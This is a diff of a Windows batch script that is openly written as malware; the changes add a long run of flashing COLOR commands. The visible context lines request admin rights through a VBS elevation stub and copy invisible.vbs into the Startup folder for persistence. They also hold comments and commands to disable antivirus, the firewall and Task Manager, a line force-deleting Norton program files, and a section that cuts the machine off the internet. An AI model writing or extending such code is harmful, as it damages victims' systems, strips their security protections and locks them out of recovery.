@@ -1,5 +1,3 @@
-COLOR 4C
-
 :: give admin
 
 set "params=%*"
@@ -12,8 +10,62 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
 XCOPY "invisible.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-
-
+COLOR 8A
+COLOR 0B
+COLOR 1C
+COLOR 2D
+COLOR 3E
+COLOR 4F
+COLOR 5F
+COLOR 6D
+COLOR 7E
+COLOR 8A
+COLOR 0B
+COLOR 1C
+COLOR 2D
+COLOR 3E
+COLOR 4F
+COLOR 5F
+COLOR 6D
+COLOR 7E
+COLOR 8A
+COLOR 0B
+COLOR 1C
+COLOR 2D
+COLOR 3E
+COLOR 4F
+COLOR 5F
+COLOR 6D
+COLOR 7E
+COLOR 40
+COLOR 8A
+COLOR 0B
+COLOR 1C
+COLOR 2D
+COLOR 3E
+COLOR 4F
+COLOR 5F
+COLOR 6D
+COLOR 7E
+COLOR 8A
+COLOR 0B
+COLOR 1C
+COLOR 2D
+COLOR 3E
+COLOR 4F
+COLOR 5F
+COLOR 6D
+COLOR 7E
+COLOR 8A
+COLOR 0B
+COLOR 1C
+COLOR 2D
+COLOR 3E
+COLOR 4F
+COLOR 5F
+COLOR 6D
+COLOR 7E
+COLOR 40
 
 :: Disable antivirus, firewall, taskmanager, to make sure your not going to get out of this...
 
@@ -43,6 +95,8 @@ del /Q /F C:\Program Files\Norton~1\*.*
 
 
 
+COLOR 0F
+
 
 :: REMOVES INTERNET (Will not let you reconect)
 
@@ -58,3 +112,5 @@ echo You have been disconected from the internet and wont be able to reconect fo
 PAUSE
 @echo off
 cls
+
+COLOR 0F
